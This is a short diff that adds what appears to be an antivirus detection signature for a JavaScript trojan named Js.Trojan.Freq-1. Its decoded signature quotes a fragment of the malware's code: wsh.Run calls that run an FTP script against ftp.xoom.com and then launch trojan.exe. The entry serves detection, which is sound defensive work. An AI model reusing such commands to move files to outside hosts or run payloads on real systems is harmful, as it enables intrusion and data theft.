@@ -1,0 +1,5 @@
+VIRUS NAME: Js.Trojan.Freq-1
+TARGET TYPE: ANY FILE
+OFFSET: *
+DECODED SIGNATURE:
+FILE.FTP',true,1);wsh.Run('ftp -v -i -s:c:\\UPLDFILE.FTP  ftp.xoom.com',true,1);wsh.Run('command /c trojan.exe
